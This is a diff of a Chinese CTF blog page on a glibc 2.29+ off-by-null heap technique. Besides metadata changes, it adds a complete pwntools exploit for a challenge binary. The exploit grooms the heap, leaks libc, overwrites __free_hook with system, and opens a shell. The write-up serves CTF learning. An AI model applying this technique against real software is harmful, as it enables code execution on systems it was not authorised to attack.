@@ -19,7 +19,7 @@
 <meta property="og:site_name" content="广莫之野">
 <meta property="og:description" content="2.29之后off-by-null的一种无需爆破1/16的构造方法">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-06-14T14:03:30.777Z">
+<meta property="og:updated_time" content="2021-10-14T09:08:05.271Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="off_by_null_after2.29">
 <meta name="twitter:description" content="2.29之后off-by-null的一种无需爆破1/16的构造方法">
@@ -30,7 +30,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1623679457587">
+  <link rel="stylesheet" href="/css/style.css?v=1637381238395">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -54,7 +54,7 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>文章</span>27</div>
+        <div><span>文章</span>32</div>
         <div><span>标签</span>3</div>
         <div><span>分类</span>0</div>
     </div>
@@ -110,7 +110,7 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">文章归档</h3>
     <div class="nexmoe-widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
     </div>
   </div>
 
@@ -135,8 +135,8 @@
     </div>
   <div class="nexmoe-post-meta">
     <a><i class="nexmoefont icon-calendar-fill"></i>2021年06月14日</a>
-    <a><i class="nexmoefont icon-areachart"></i>754 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 4 分钟</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.4k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 7 分钟</a>
     
     
       <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
@@ -241,6 +241,123 @@ add(0x100-1,p64(libc_base + libc.symbols[&#39;system&#39;]))
 sh.sendline(&#39;3&#39;)
 sh.sendline(&#39;1&#39;)
 sh.interactive()</code></pre>
+<h2 id="另一道例题"><a href="#另一道例题" class="headerlink" title="另一道例题"></a>另一道例题</h2><pre><code class="python">#encoding:utf-8
+from pwn import *
+context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
+context.log_level = &#39;DEBUG&#39;
+sh = process(&#39;./tree&#39;)
+# sh = remote()
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+
+def menu(choice):
+    sh.recvuntil(&quot;&gt;&gt;\n&quot;)
+    sh.sendline(str(choice))
+
+def add(size):
+    menu(1)
+    sh.recvuntil(&quot;length\n&quot;)
+    sh.sendline(str(size))
+
+def edit(idx, content):
+    menu(2)
+    sh.recvuntil(&quot;:\n&quot;)
+    sh.sendline(str(idx))
+    sh.recvuntil(&quot;:&quot;)
+    sh.send(content)
+
+def delete(idx):
+    menu(3)
+    sh.recvuntil(&quot;idx:\n&quot;)
+    sh.sendline(str(idx))
+
+def show(idx):
+    menu(4)
+    sh.recvuntil(&quot;idx:\n&quot;)
+    sh.sendline(str(idx))
+    sh.recvuntil(&quot;Name:\n&quot;)
+    data = sh.recv(6)
+    return data
+
+
+##第一步 0是fd = c00 3是要构造的假堆块 合并时通过prev_size向前找到的就是c00 5是bk = c00
+add(0x418) #0 fake-&gt;fd 9290
+add(0x128) #1
+add(0x418) #2
+add(0x438) #3 target 9c00
+add(0x148) #4
+add(0x428) # 5 fake-&gt;bk a190
+add(0x138) # 6
+delete(0)
+delete(3)
+delete(5)
+
+##第二步 重新分配2/3的size 伪造c00为一个chunk 设置其size为b01 将所有块都分配出来清理bins
+delete(2) #2 &amp; 3 unlink
+add(0x438)  # 0 set size 
+edit(0,b&#39;a&#39; * 0x418 + p64(0xb01))
+add(0x418)  # 2 c20
+add(0x428)  # 3 bk 190
+add(0x418)  # 5 fd 290
+
+## 先free fake_chunk(c00)-&gt;fd(290) 然后写一字节\x00 这样fake-&gt;fd-&gt;bk = fake
+delete(5)
+delete(2)
+add(0x418)  # 2 partial overwrite bk -&gt; 9c00
+edit(2,b&#39;\x01&#39; * 9)
+add(0x418)  # 5 c20
+
+## 修改fake_chunk-&gt;bk-&gt;fd 因为要置fd为一个堆地址 所以要后free 这个bk_chunk 进unsortedbin
+## 因为unsorted的遍历顺序是先进先出 所以 a190 -&gt; c20 -&gt; main_arena 顺序是先过c20再过a190 
+## 因为c20size更小 不符合条件会被放进largebin 进而会影响a190的fd(变回main_arena)
+## 所以这里的选择是申请个很大的chunk将两个都放进largebin在申请a190出来
+delete(5)
+delete(3)
+add(0x9F8)  # 3 chunk into largebin
+add(0x428)  # 5 partial overwrite fd
+edit(5,b&#39;\x01&#39;)
+add(0x418)  # 7 c20
+
+
+## 触发offbynull 向前合并
+gdb.attach(sh,&#39;b * $rebase(0x1781)&#39;)
+add(0x108) #8 gap
+edit(8,p64(0) + p64(0x111))
+edit(6, b&#39;\x01&#39; * 0x138) #offbynull
+edit(6, b&#39;\x01&#39; * 0x130 + p64(0xb00)) #prev_size
+delete(3)
+##
+
+edit(1,&#39;/bin/sh\x00&#39;)
+add(0x10) #3
+# show(7)
+libc_base = u64(show(7).ljust(8,b&#39;\x00&#39;)) - 0x1EBBE0
+log.success(&quot;libc_base = &quot; + hex(libc_base))
+fake_fast = 0x1EBB3D + libc_base
+
+add(0x410 - 0x110) #9
+add(0x100) #10
+add(0x100) # 11 4
+for i in range(7):
+    add(0x100) #12-18
+
+for i in range(7):
+    delete(12+i)
+
+delete(11)
+delete(10)
+add(0x100) #10
+# 
+
+delete(4)
+add(0x210)
+edit(4,b&#39;a&#39; * 0x110 + p64(libc_base + libc.symbols[&#39;__free_hook&#39;]))
+add(0x100)
+add(0x100)
+edit(12,p64(libc_base + libc.symbols[&#39;system&#39;]))
+
+sh.sendline(&#39;3&#39;)
+sh.sendline(&#39;1&#39;)
+sh.interactive()</code></pre>
 
   </article>
   
@@ -279,7 +396,7 @@ sh.interactive()</code></pre>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1623679457591"></script>
+<script src="/js/app.js?v=1637381238409"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
